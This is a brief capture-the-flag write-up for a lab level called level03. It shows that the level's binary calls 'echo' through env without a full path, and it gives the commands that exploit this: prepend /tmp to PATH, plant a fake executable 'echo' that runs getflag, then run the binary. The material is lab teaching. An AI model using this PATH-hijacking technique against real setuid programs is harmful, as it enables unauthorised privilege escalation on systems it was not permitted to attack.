decompiled binary or $strings level03 shows that the command /usr/bin/env echo "Exploit me" is run inside the program
we can take advantage of the non absolute path to run another command like getflag

1) add /tmp to $PATH with : $export PATH=/tmp:$PATH

2) place a fake echo containing getflag in /tmp : $echo "getflag" > /tmp/echo

3) add execution rights : $chmod +x /tmp/echo

4) execute ./level03

getflag executed from /tmp gives the flag
